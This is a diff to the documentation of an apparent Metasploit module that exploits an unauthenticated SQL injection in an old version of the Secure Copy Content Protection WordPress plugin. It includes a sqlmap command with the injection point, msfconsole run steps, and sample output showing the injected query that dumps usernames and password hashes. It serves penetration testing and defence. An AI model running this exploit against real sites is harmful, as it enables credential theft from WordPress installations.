@@ -4,10 +4,15 @@ Secure Copy Content Protection and Content Locking, a WordPress plugin,
 prior to 2.8.2 is affected by an unauthenticated SQL injection via the
 `sccp_id[]` parameter.
 
-The plugin can be downloaded
+Remote attackers can exploit this vulnerability to dump usernames and password hashes
+from the`wp_users` table of the affected WordPress installation. These password hashes
+can then be cracked offline using tools such as Hashcat to obtain valid login
+credentials for the affected WordPress installation.
+
+A vulnerable version (2.8.1) of the plugin can be downloaded
 [here](https://downloads.wordpress.org/plugin/secure-copy-content-protection.2.8.1.zip)
 
-This module slightly replicates sqlmap running as:
+The output from running this module will be somewhat similar to the following `sqlmap` command:
 
 ```
 sqlmap --dbms=mysql -u "http://1.1.1.1/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)*&type=json" --technique T -T wp_users -C user_login,user_pass --dump
@@ -19,19 +24,20 @@ sqlmap --dbms=mysql -u "http://1.1.1.1/wp-admin/admin-ajax.php?action=ays_sccp_r
 2. Start msfconsole
 3. Do: `use auxiliary/scanner/http/wp_secure_copy_content_protection_sqli`
 4. Do: `set rhosts [ip]`
+5. Optionally set `USER_COUNT` to the number of users you want to dump the credentials of.
 5. Do: `run`
-6. You should get the users and hashes returned.
-
+6. *Verify* that `USER_COUNT` number of users's usernames and password hashes are gathered from the `wp_users` table of the target WordPress installation.
 ## Options
 
 ### ACTION: List Users
 
-This action lists `COUNT` users and password hashes.
+This action exploits the unauthenticated SQL injection and lists `USER_COUNT`
+users and password hashes from the `wp_users` table of the affected WordPress installation.
 
-### COUNT
+### USER_COUNT
 
-If action `List Users` is selected (default), this is the number of users to enumerate.
-The larger this list, the more time it will take.  Defaults to `3`.
+If action `List Users` is selected (default), this is the number of users to enumerate the credentials of.
+The larger this number, the more time it will take for the module to run.  Defaults to `3`.
 
 ## Scenarios
 
@@ -51,7 +57,6 @@ resource (secure_copy.rb)> run
 [*] Checking /wp-content/plugins/secure-copy-content-protection/Readme.txt
 [*] Checking /wp-content/plugins/secure-copy-content-protection/README.txt
 [*] Found version 2.8.1 in the plugin
-[+] Vulnerable version of Secure Copy Content Protection and Content Locking detected
 [+] The target appears to be vulnerable.
 [*] Enumerating Usernames and Password Hashes
 [*] {SQLi} Executing (select group_concat(dwOr) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) dwOr from wp_users limit 3) fOXVNQ)
